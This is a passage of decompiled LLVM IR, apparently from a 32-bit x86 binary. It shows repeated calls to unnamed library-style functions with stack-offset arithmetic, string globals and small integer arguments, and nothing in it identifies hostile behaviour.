  store i32 %v1_80487bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487bb, i32* %v1_80487ba, align 4
  %v2_80487c3 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_80487c3, i32* %eax.global-to-local, align 4
  %v0_80487c8 = load i32, i32* @esp, align 4
  %v1_80487c8 = inttoptr i32 %v0_80487c8 to i32*
  %v2_80487c8 = load i32, i32* %v1_80487c8, align 4
  store i32 %v2_80487c8, i32* %edx.global-to-local, align 4
  %v3_80487c8 = add i32 %v0_80487c8, 4
  %v1_80487c9 = inttoptr i32 %v3_80487c8 to i32*
  %v2_80487c9 = load i32, i32* %v1_80487c9, align 4
  store i32 %v2_80487c9, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_8054aef.8 to i32), i32* %v1_80487c9, align 4
  %v1_80487cf = add i32 %v0_80487c8, 10388
  store i32 %v1_80487cf, i32* %edx.global-to-local, align 4
  %v2_80487d6 = add i32 %v1_80487cf, %v2_80487c3
  store i32 %v2_80487d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80487d6, i32* %v1_80487c8, align 4
  %v3_80487da = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487da, i32* %eax.global-to-local, align 4
  %v0_80487df = load i32, i32* @esp, align 4
  %v1_80487df = inttoptr i32 %v0_80487df to i32*
  %v2_80487df = load i32, i32* %v1_80487df, align 4
  store i32 %v2_80487df, i32* @ebx, align 4
  %v1_80487e0 = add i32 %v0_80487df, 10388
  store i32 %v1_80487e0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487e0, i32* %v1_80487df, align 4
  %v2_80487e8 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_80487e8, i32* %eax.global-to-local, align 4
  %v0_80487ed = load i32, i32* @esp, align 4
  %v1_80487ed = inttoptr i32 %v0_80487ed to i32*
  %v3_80487ed = add i32 %v0_80487ed, 4
  %v0_80487ee = load i32, i32* @edi, align 4
  %v1_80487ee = add i32 %v0_80487ee, 20
  store i32 %v1_80487ee, i32* %edx.global-to-local, align 4
  %v1_80487f1 = inttoptr i32 %v3_80487ed to i32*
  %v2_80487f1 = load i32, i32* %v1_80487f1, align 4
  store i32 %v2_80487f1, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487ee, i32* %v1_80487f1, align 4
  %v1_80487f3 = add i32 %v0_80487ed, 10388
  store i32 %v1_80487f3, i32* %edx.global-to-local, align 4
  %v2_80487fa = add i32 %v1_80487f3, %v2_80487e8
  store i32 %v2_80487fa, i32* %eax.global-to-local, align 4
  store i32 %v2_80487fa, i32* %v1_80487ed, align 4
  %v3_80487fe = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487fe, i32* %eax.global-to-local, align 4
  %v0_8048803 = load i32, i32* @esp, align 4
  %v1_8048803 = inttoptr i32 %v0_8048803 to i32*
  %v2_8048803 = load i32, i32* %v1_8048803, align 4
  store i32 %v2_8048803, i32* @ebx, align 4
  %v1_8048804 = add i32 %v0_8048803, 10388
  store i32 %v1_8048804, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048804, i32* %v1_8048803, align 4
  %v2_804880c = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_804880c, i32* %eax.global-to-local, align 4
  %v0_8048811 = load i32, i32* @esp, align 4
  %v1_8048811 = inttoptr i32 %v0_8048811 to i32*
  %v2_8048811 = load i32, i32* %v1_8048811, align 4
  store i32 %v2_8048811, i32* %edx.global-to-local, align 4
  %v3_8048811 = add i32 %v0_8048811, 4
  %v1_8048812 = inttoptr i32 %v3_8048811 to i32*
  %v2_8048812 = load i32, i32* %v1_8048812, align 4
  store i32 %v2_8048812, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8054b07.9 to i32), i32* %v1_8048812, align 4
  %v1_8048818 = add i32 %v0_8048811, 10388
  store i32 %v1_8048818, i32* %edx.global-to-local, align 4
  %v2_804881f = add i32 %v1_8048818, %v2_804880c
  store i32 %v2_804881f, i32* %eax.global-to-local, align 4
  store i32 %v2_804881f, i32* %v1_8048811, align 4
  %v3_8048823 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048823, i32* %eax.global-to-local, align 4
  %v0_8048828 = load i32, i32* @esp, align 4
  %v1_8048828 = inttoptr i32 %v0_8048828 to i32*
  %v2_8048828 = load i32, i32* %v1_8048828, align 4
  store i32 %v2_8048828, i32* @ebx, align 4
  %v1_8048829 = add i32 %v0_8048828, 10388
  store i32 %v1_8048829, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048829, i32* %v1_8048828, align 4
  %v2_8048831 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048831, i32* %eax.global-to-local, align 4
  %v0_8048836 = load i32, i32* @esp, align 4
  %v1_8048836 = inttoptr i32 %v0_8048836 to i32*
  %v3_8048836 = add i32 %v0_8048836, 4
  %v0_8048837 = load i32, i32* @edi, align 4
  %v1_8048837 = add i32 %v0_8048837, 789
  store i32 %v1_8048837, i32* %edx.global-to-local, align 4
  %v1_804883d = inttoptr i32 %v3_8048836 to i32*
  %v2_804883d = load i32, i32* %v1_804883d, align 4
  store i32 %v2_804883d, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048837, i32* %v1_804883d, align 4
  %v1_804883f = add i32 %v0_8048836, 10388
  store i32 %v1_804883f, i32* %edx.global-to-local, align 4
  %v2_8048846 = add i32 %v1_804883f, %v2_8048831
  store i32 %v2_8048846, i32* %eax.global-to-local, align 4
  store i32 %v2_8048846, i32* %v1_8048836, align 4
  %v3_804884a = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804884a, i32* %eax.global-to-local, align 4
  %v0_804884f = load i32, i32* @esp, align 4
  %v1_804884f = inttoptr i32 %v0_804884f to i32*
  %v2_804884f = load i32, i32* %v1_804884f, align 4
  store i32 %v2_804884f, i32* %eax.global-to-local, align 4
  %v1_8048850 = add i32 %v0_804884f, 10388
  store i32 %v1_8048850, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048850, i32* %v1_804884f, align 4
  %v2_8048858 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048858, i32* %eax.global-to-local, align 4
  %v0_804885d = load i32, i32* @esp, align 4
  %v1_804885d = inttoptr i32 %v0_804885d to i32*
  %v2_804885d = load i32, i32* %v1_804885d, align 4
  store i32 %v2_804885d, i32* %ecx.global-to-local, align 4
  %v3_804885d = add i32 %v0_804885d, 4
  %v1_804885e = inttoptr i32 %v3_804885d to i32*
  %v2_804885e = load i32, i32* %v1_804885e, align 4
  store i32 %v2_804885e, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v1_804885e, align 4
  %v1_8048864 = add i32 %v0_804885d, 10388
  store i32 %v1_8048864, i32* %edx.global-to-local, align 4
  %v2_804886b = add i32 %v1_8048864, %v2_8048858
  store i32 %v2_804886b, i32* %eax.global-to-local, align 4
  store i32 %v2_804886b, i32* %v1_804885d, align 4
  %v3_804886f = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804886f, i32* %eax.global-to-local, align 4
  %v0_8048874 = load i32, i32* @esp, align 4
  %v1_8048874 = inttoptr i32 %v0_8048874 to i32*
  store i32 32, i32* %v1_8048874, align 4
  %v2_804887b = call i32 @function_8051300(i8 %v1_804887b)
  store i32 %v2_804887b, i32* %eax.global-to-local, align 4
  %v0_8048880 = load i32, i32* @esp, align 4
  %v1_8048880 = inttoptr i32 %v0_8048880 to i32*
  %v2_8048880 = load i32, i32* %v1_8048880, align 4
  store i32 %v2_8048880, i32* %eax.global-to-local, align 4
  %v3_8048880 = add i32 %v0_8048880, 4
  %v1_8048881 = inttoptr i32 %v3_8048880 to i32*
  %v2_8048881 = load i32, i32* %v1_8048881, align 4
  store i32 %v2_8048881, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048881, align 4
  store i32 32, i32* %v1_8048880, align 4
  %v3_8048886 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048886, i32* %eax.global-to-local, align 4
  store i32 %v3_8048886, i32* @ebx, align 4
  %v0_804888d = load i32, i32* @esp, align 4
  %v1_804888d = inttoptr i32 %v0_804888d to i32*
  %v2_804888d = load i32, i32* %v1_804888d, align 4
  store i32 %v2_804888d, i32* %eax.global-to-local, align 4
  %v1_804888e = add i32 %v0_804888d, 10388
  store i32 %v1_804888e, i32* %ecx.global-to-local, align 4
  store i32 %v1_804888e, i32* %v1_804888d, align 4
  %v2_8048896 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048896, i32* %eax.global-to-local, align 4
  %v0_804889b = load i32, i32* @esp, align 4
  %v1_804889b = inttoptr i32 %v0_804889b to i32*
  %v2_804889b = load i32, i32* %v1_804889b, align 4
  store i32 %v2_804889b, i32* %edx.global-to-local, align 4
  %v3_804889b = add i32 %v0_804889b, 4
  %v1_804889c = inttoptr i32 %v3_804889b to i32*
  %v2_804889c = load i32, i32* %v1_804889c, align 4
  store i32 %v2_804889c, i32* %ecx.global-to-local, align 4
  %v0_804889d = load i32, i32* @ebx, align 4
  store i32 %v0_804889d, i32* %v1_804889c, align 4
  %v1_804889e = add i32 %v0_804889b, 10388
  store i32 %v1_804889e, i32* %edx.global-to-local, align 4
  %v2_80488a5 = add i32 %v1_804889e, %v2_8048896
  store i32 %v2_80488a5, i32* %eax.global-to-local, align 4
  store i32 %v2_80488a5, i32* %v1_804889b, align 4
  %v3_80488a9 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488a9, i32* %eax.global-to-local, align 4
  %v0_80488ae = load i32, i32* @esp, align 4
  %v1_80488ae = inttoptr i32 %v0_80488ae to i32*
  store i32 32, i32* %v1_80488ae, align 4
  %v2_80488b5 = call i32 @function_8051280(i8 %v1_804887b)
  store i32 %v2_80488b5, i32* %eax.global-to-local, align 4
  %v0_80488ba = load i32, i32* @esp, align 4
  %v1_80488ba = inttoptr i32 %v0_80488ba to i32*
  %v2_80488ba = load i32, i32* %v1_80488ba, align 4
  store i32 %v2_80488ba, i32* %eax.global-to-local, align 4
  %v1_80488bb = add i32 %v0_80488ba, 10388
  store i32 %v1_80488bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488bb, i32* %v1_80488ba, align 4
  %v2_80488c3 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_80488c3, i32* %eax.global-to-local, align 4
  %v0_80488c8 = load i32, i32* @esp, align 4
  %v1_80488c8 = inttoptr i32 %v0_80488c8 to i32*
  %v2_80488c8 = load i32, i32* %v1_80488c8, align 4
  store i32 %v2_80488c8, i32* %ecx.global-to-local, align 4
  %v3_80488c8 = add i32 %v0_80488c8, 4
  %v1_80488c9 = inttoptr i32 %v3_80488c8 to i32*
  %v2_80488c9 = load i32, i32* %v1_80488c9, align 4
  store i32 %v2_80488c9, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v1_80488c9, align 4
  %v1_80488cf = add i32 %v0_80488c8, 10388
  store i32 %v1_80488cf, i32* %edx.global-to-local, align 4
  %v2_80488d6 = add i32 %v1_80488cf, %v2_80488c3
  store i32 %v2_80488d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80488d6, i32* %v1_80488c8, align 4
  %v3_80488da = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488da, i32* %eax.global-to-local, align 4
  %v0_80488df = load i32, i32* @esp, align 4
  %v1_80488df = inttoptr i32 %v0_80488df to i32*
  store i32 33, i32* %v1_80488df, align 4
  %v2_80488e6 = call i32 @function_8051300(i8 %v1_804887b)
  store i32 %v2_80488e6, i32* %eax.global-to-local, align 4
  %v0_80488eb = load i32, i32* @esp, align 4
  %v1_80488eb = inttoptr i32 %v0_80488eb to i32*
  %v2_80488eb = load i32, i32* %v1_80488eb, align 4
  store i32 %v2_80488eb, i32* %eax.global-to-local, align 4
  %v3_80488eb = add i32 %v0_80488eb, 4
  %v1_80488ec = inttoptr i32 %v3_80488eb to i32*
  %v2_80488ec = load i32, i32* %v1_80488ec, align 4
  store i32 %v2_80488ec, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80488ec, align 4
  store i32 33, i32* %v1_80488eb, align 4
  %v3_80488f1 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80488f1, i32* %eax.global-to-local, align 4
  store i32 %v3_80488f1, i32* @ebx, align 4
  %v0_80488f8 = load i32, i32* @esp, align 4
  %v1_80488f8 = inttoptr i32 %v0_80488f8 to i32*
  %v2_80488f8 = load i32, i32* %v1_80488f8, align 4
  store i32 %v2_80488f8, i32* %eax.global-to-local, align 4
  %v1_80488f9 = add i32 %v0_80488f8, 10388
  store i32 %v1_80488f9, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488f9, i32* %v1_80488f8, align 4
  %v2_8048901 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048901, i32* %eax.global-to-local, align 4
  %v0_8048906 = load i32, i32* @esp, align 4
  %v1_8048906 = inttoptr i32 %v0_8048906 to i32*
  %v2_8048906 = load i32, i32* %v1_8048906, align 4
  store i32 %v2_8048906, i32* %edx.global-to-local, align 4
  %v3_8048906 = add i32 %v0_8048906, 4
  %v1_8048907 = inttoptr i32 %v3_8048906 to i32*
  %v2_8048907 = load i32, i32* %v1_8048907, align 4
  store i32 %v2_8048907, i32* %ecx.global-to-local, align 4
  %v0_8048908 = load i32, i32* @ebx, align 4
  store i32 %v0_8048908, i32* %v1_8048907, align 4
  %v1_8048909 = add i32 %v0_8048906, 10388
  store i32 %v1_8048909, i32* %edx.global-to-local, align 4
  %v2_8048910 = add i32 %v1_8048909, %v2_8048901
  store i32 %v2_8048910, i32* %eax.global-to-local, align 4
  store i32 %v2_8048910, i32* %v1_8048906, align 4
  %v3_8048914 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048914, i32* %eax.global-to-local, align 4
  %v0_8048919 = load i32, i32* @esp, align 4
  %v1_8048919 = inttoptr i32 %v0_8048919 to i32*
  store i32 33, i32* %v1_8048919, align 4
  %v2_8048920 = call i32 @function_8051280(i8 %v1_804887b)
  store i32 %v2_8048920, i32* %eax.global-to-local, align 4
  %v0_8048925 = load i32, i32* @esp, align 4
  %v1_8048925 = inttoptr i32 %v0_8048925 to i32*
  %v2_8048925 = load i32, i32* %v1_8048925, align 4
  store i32 %v2_8048925, i32* %eax.global-to-local, align 4
  %v1_8048926 = add i32 %v0_8048925, 10388
  store i32 %v1_8048926, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048926, i32* %v1_8048925, align 4
  %v2_804892e = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_804892e, i32* %eax.global-to-local, align 4
  %v0_8048933 = load i32, i32* @esp, align 4
  %v1_8048933 = inttoptr i32 %v0_8048933 to i32*
  %v2_8048933 = load i32, i32* %v1_8048933, align 4
  store i32 %v2_8048933, i32* %ecx.global-to-local, align 4
  %v3_8048933 = add i32 %v0_8048933, 4
  %v1_8048934 = inttoptr i32 %v3_8048933 to i32*
  %v2_8048934 = load i32, i32* %v1_8048934, align 4
  store i32 %v2_8048934, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v1_8048934, align 4
  %v1_804893a = add i32 %v0_8048933, 10388
  store i32 %v1_804893a, i32* %edx.global-to-local, align 4
  %v2_8048941 = add i32 %v1_804893a, %v2_804892e
  store i32 %v2_8048941, i32* %eax.global-to-local, align 4
  store i32 %v2_8048941, i32* %v1_8048933, align 4
  %v3_8048945 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048945, i32* %eax.global-to-local, align 4
  %v0_804894a = load i32, i32* @esp, align 4
  %v1_804894a = inttoptr i32 %v0_804894a to i32*
  store i32 34, i32* %v1_804894a, align 4
  %v2_8048951 = call i32 @function_8051300(i8 %v1_804887b)
  store i32 %v2_8048951, i32* %eax.global-to-local, align 4
  %v0_8048956 = load i32, i32* @esp, align 4
  %v1_8048956 = inttoptr i32 %v0_8048956 to i32*
  %v2_8048956 = load i32, i32* %v1_8048956, align 4
  store i32 %v2_8048956, i32* %eax.global-to-local, align 4
  %v3_8048956 = add i32 %v0_8048956, 4
  %v1_8048957 = inttoptr i32 %v3_8048956 to i32*
  %v2_8048957 = load i32, i32* %v1_8048957, align 4
  store i32 %v2_8048957, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048957, align 4
  store i32 34, i32* %v1_8048956, align 4
  %v3_804895c = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804895c, i32* %eax.global-to-local, align 4
  store i32 %v3_804895c, i32* @ebx, align 4
  %v0_8048963 = load i32, i32* @esp, align 4
  %v1_8048963 = inttoptr i32 %v0_8048963 to i32*
  %v2_8048963 = load i32, i32* %v1_8048963, align 4
  store i32 %v2_8048963, i32* %eax.global-to-local, align 4
  %v1_8048964 = add i32 %v0_8048963, 10388
  store i32 %v1_8048964, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048964, i32* %v1_8048963, align 4
  %v2_804896c = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_804896c, i32* %eax.global-to-local, align 4
  %v0_8048971 = load i32, i32* @esp, align 4
  %v1_8048971 = inttoptr i32 %v0_8048971 to i32*
  %v2_8048971 = load i32, i32* %v1_8048971, align 4
  store i32 %v2_8048971, i32* %edx.global-to-local, align 4
  %v3_8048971 = add i32 %v0_8048971, 4
  %v1_8048972 = inttoptr i32 %v3_8048971 to i32*
  %v2_8048972 = load i32, i32* %v1_8048972, align 4
  store i32 %v2_8048972, i32* %ecx.global-to-local, align 4
  %v0_8048973 = load i32, i32* @ebx, align 4
  store i32 %v0_8048973, i32* %v1_8048972, align 4
  %v1_8048974 = add i32 %v0_8048971, 10388
  store i32 %v1_8048974, i32* %edx.global-to-local, align 4
  %v2_804897b = add i32 %v1_8048974, %v2_804896c
  store i32 %v2_804897b, i32* %eax.global-to-local, align 4
  store i32 %v2_804897b, i32* %v1_8048971, align 4
  %v3_804897f = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804897f, i32* %eax.global-to-local, align 4
  %v0_8048984 = load i32, i32* @esp, align 4
  %v1_8048984 = inttoptr i32 %v0_8048984 to i32*
  store i32 34, i32* %v1_8048984, align 4
  %v2_804898b = call i32 @function_8051280(i8 %v1_804887b)
  store i32 %v2_804898b, i32* %eax.global-to-local, align 4
  %v0_8048990 = load i32, i32* @esp, align 4
  %v1_8048990 = inttoptr i32 %v0_8048990 to i32*
  %v1_8048991 = add i32 %v0_8048990, 10388
  store i32 %v1_8048991, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048991, i32* %v1_8048990, align 4
  %v2_8048999 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048999, i32* %eax.global-to-local, align 4
  %v0_804899e = load i32, i32* @esp, align 4
  %v1_804899e = inttoptr i32 %v0_804899e to i32*
  %v2_804899e = load i32, i32* %v1_804899e, align 4
  store i32 %v2_804899e, i32* @ebx, align 4
  %v3_804899e = add i32 %v0_804899e, 4
  %v1_804899f = inttoptr i32 %v3_804899e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v1_804899f, align 4
  %v1_80489a5 = add i32 %v0_804899e, 10388
  store i32 %v1_80489a5, i32* %edx.global-to-local, align 4
  %v2_80489ac = add i32 %v1_80489a5, %v2_8048999
  store i32 %v2_80489ac, i32* %eax.global-to-local, align 4
  store i32 %v2_80489ac, i32* %v1_804899e, align 4
  %v3_80489b0 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489b0, i32* %eax.global-to-local, align 4
  %v0_80489b5 = load i32, i32* @esp, align 4
  %v1_80489b5 = add i32 %v0_80489b5, 16
  %v1_80489b8 = add i32 %v0_80489b5, 68
  %v2_80489b8 = inttoptr i32 %v1_80489b8 to i32*
  %v3_80489b8 = load i32, i32* %v2_80489b8, align 4
  store i32 %v3_80489b8, i32* %ecx.global-to-local, align 4
  %v1_80489bc = icmp eq i32 %v3_80489b8, 0
  store i1 %v1_80489bc, i1* %zf.global-to-local, align 1
  br i1 %v1_80489bc, label %dec_label_pc_8048ad8, label %dec_label_pc_80489c4

dec_label_pc_80489c4:                             ; preds = %dec_label_pc_8048700
  %v9_80489c4 = icmp eq i32 %v0_80489b5, -4
  store i1 %v9_80489c4, i1* %zf.global-to-local, align 1
  %v2_80489c7 = inttoptr i32 %v0_80489b5 to i32*
  store i32 35, i32* %v2_80489c7, align 4
  %v2_80489c9 = call i32 @function_8051300(i8 %v1_804887b)
  store i32 %v2_80489c9, i32* %eax.global-to-local, align 4
  %v0_80489ce = load i32, i32* @esp, align 4
  %v1_80489ce = inttoptr i32 %v0_80489ce to i32*
  %v2_80489ce = load i32, i32* %v1_80489ce, align 4
  store i32 %v2_80489ce, i32* %eax.global-to-local, align 4
  %v3_80489ce = add i32 %v0_80489ce, 4
  %v1_80489cf = inttoptr i32 %v3_80489ce to i32*
  %v2_80489cf = load i32, i32* %v1_80489cf, align 4
  store i32 %v2_80489cf, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80489cf, align 4
  store i32 35, i32* %v1_80489ce, align 4
  %v3_80489d4 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80489d4, i32* %eax.global-to-local, align 4
  store i32 %v3_80489d4, i32* @ebx, align 4
  %v0_80489db = load i32, i32* @esp, align 4
  %v1_80489db = inttoptr i32 %v0_80489db to i32*
  %v2_80489db = load i32, i32* %v1_80489db, align 4
  store i32 %v2_80489db, i32* %eax.global-to-local, align 4
  %v1_80489dc = add i32 %v0_80489db, 10388
  store i32 %v1_80489dc, i32* %ecx.global-to-local, align 4
  store i32 %v1_80489dc, i32* %v1_80489db, align 4
  %v2_80489e4 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_80489e4, i32* %eax.global-to-local, align 4
  %v0_80489e9 = load i32, i32* @esp, align 4
  %v1_80489e9 = inttoptr i32 %v0_80489e9 to i32*
  %v2_80489e9 = load i32, i32* %v1_80489e9, align 4
  store i32 %v2_80489e9, i32* %edx.global-to-local, align 4
  %v3_80489e9 = add i32 %v0_80489e9, 4
  %v1_80489ea = inttoptr i32 %v3_80489e9 to i32*
  %v2_80489ea = load i32, i32* %v1_80489ea, align 4
  store i32 %v2_80489ea, i32* %ecx.global-to-local, align 4
  %v0_80489eb = load i32, i32* @ebx, align 4
  store i32 %v0_80489eb, i32* %v1_80489ea, align 4
  %v1_80489ec = add i32 %v0_80489e9, 10388
  store i32 %v1_80489ec, i32* %edx.global-to-local, align 4
  %v2_80489f3 = add i32 %v1_80489ec, %v2_80489e4
  store i32 %v2_80489f3, i32* %eax.global-to-local, align 4
  store i32 %v2_80489f3, i32* %v1_80489e9, align 4
  %v3_80489f7 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489f7, i32* %eax.global-to-local, align 4
  %v0_80489fc = load i32, i32* @esp, align 4
  %v1_80489fc = inttoptr i32 %v0_80489fc to i32*
  store i32 35, i32* %v1_80489fc, align 4
  %v2_8048a03 = call i32 @function_8051280(i8 %v1_804887b)
  store i32 %v2_8048a03, i32* %eax.global-to-local, align 4
  %v0_8048a08 = load i32, i32* @esp, align 4
  %v1_8048a08 = inttoptr i32 %v0_8048a08 to i32*
  %v2_8048a08 = load i32, i32* %v1_8048a08, align 4
  store i32 %v2_8048a08, i32* %eax.global-to-local, align 4
  %v1_8048a09 = add i32 %v0_8048a08, 10388
  store i32 %v1_8048a09, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a09, i32* %v1_8048a08, align 4
  %v2_8048a11 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048a11, i32* %eax.global-to-local, align 4
  %v0_8048a16 = load i32, i32* @esp, align 4
  %v1_8048a16 = inttoptr i32 %v0_8048a16 to i32*
  %v2_8048a16 = load i32, i32* %v1_8048a16, align 4
  store i32 %v2_8048a16, i32* %ecx.global-to-local, align 4
  %v3_8048a16 = add i32 %v0_8048a16, 4
  %v1_8048a17 = inttoptr i32 %v3_8048a16 to i32*
  %v2_8048a17 = load i32, i32* %v1_8048a17, align 4
  store i32 %v2_8048a17, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v1_8048a17, align 4
  %v1_8048a1d = add i32 %v0_8048a16, 10388
  store i32 %v1_8048a1d, i32* %edx.global-to-local, align 4
  %v2_8048a24 = add i32 %v1_8048a1d, %v2_8048a11
  store i32 %v2_8048a24, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a24, i32* %v1_8048a16, align 4
  %v3_8048a28 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a28, i32* %eax.global-to-local, align 4
  %v0_8048a2d = load i32, i32* @esp, align 4
  %v1_8048a2d = inttoptr i32 %v0_8048a2d to i32*
  %v2_8048a2d = load i32, i32* %v1_8048a2d, align 4
  store i32 %v2_8048a2d, i32* %eax.global-to-local, align 4
  %v3_8048a2d = add i32 %v0_8048a2d, 4
  %v1_8048a2e = inttoptr i32 %v3_8048a2d to i32*
  %v2_8048a2e = load i32, i32* %v1_8048a2e, align 4
  store i32 %v2_8048a2e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048a2e, align 4
  store i32 40, i32* %v1_8048a2d, align 4
  %v3_8048a33 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048a33, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a33, i32* @ebx, align 4
  %v0_8048a3a = load i32, i32* @esp, align 4
  %v1_8048a3a = inttoptr i32 %v0_8048a3a to i32*
  %v2_8048a3a = load i32, i32* %v1_8048a3a, align 4
  store i32 %v2_8048a3a, i32* %eax.global-to-local, align 4
  %v1_8048a3b = add i32 %v0_8048a3a, 10388
  store i32 %v1_8048a3b, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a3b, i32* %v1_8048a3a, align 4
  %v2_8048a43 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048a43, i32* %eax.global-to-local, align 4
  %v0_8048a48 = load i32, i32* @esp, align 4
  %v1_8048a48 = inttoptr i32 %v0_8048a48 to i32*
  %v2_8048a48 = load i32, i32* %v1_8048a48, align 4
  store i32 %v2_8048a48, i32* %edx.global-to-local, align 4
  %v3_8048a48 = add i32 %v0_8048a48, 4
  %v1_8048a49 = inttoptr i32 %v3_8048a48 to i32*
  %v2_8048a49 = load i32, i32* %v1_8048a49, align 4
  store i32 %v2_8048a49, i32* %ecx.global-to-local, align 4
  %v0_8048a4a = load i32, i32* @ebx, align 4
  store i32 %v0_8048a4a, i32* %v1_8048a49, align 4
  %v1_8048a4b = add i32 %v0_8048a48, 10388
  store i32 %v1_8048a4b, i32* %edx.global-to-local, align 4
  %v2_8048a52 = add i32 %v1_8048a4b, %v2_8048a43
  store i32 %v2_8048a52, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a52, i32* %v1_8048a48, align 4
  %v3_8048a56 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a56, i32* %eax.global-to-local, align 4
  %v0_8048a5b = load i32, i32* @esp, align 4
  %v1_8048a5b = inttoptr i32 %v0_8048a5b to i32*
  %v2_8048a5b = load i32, i32* %v1_8048a5b, align 4
  store i32 %v2_8048a5b, i32* @ebx, align 4
  %v1_8048a5c = add i32 %v0_8048a5b, 10388
  store i32 %v1_8048a5c, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a5c, i32* %v1_8048a5b, align 4
  %v2_8048a64 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048a64, i32* %eax.global-to-local, align 4
  %v0_8048a69 = load i32, i32* @esp, align 4
  %v1_8048a69 = inttoptr i32 %v0_8048a69 to i32*
  %v2_8048a69 = load i32, i32* %v1_8048a69, align 4
  store i32 %v2_8048a69, i32* %edx.global-to-local, align 4
  %v3_8048a69 = add i32 %v0_8048a69, 4
  %v1_8048a6a = inttoptr i32 %v3_8048a69 to i32*
  %v2_8048a6a = load i32, i32* %v1_8048a6a, align 4
  store i32 %v2_8048a6a, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054b1f.7 to i32), i32* %v1_8048a6a, align 4
  %v1_8048a70 = add i32 %v0_8048a69, 10388
  store i32 %v1_8048a70, i32* %edx.global-to-local, align 4
  %v2_8048a77 = add i32 %v1_8048a70, %v2_8048a64
  store i32 %v2_8048a77, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a77, i32* %v1_8048a69, align 4
  %v3_8048a7b = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a7b, i32* %eax.global-to-local, align 4
  %v0_8048a80 = load i32, i32* @esp, align 4
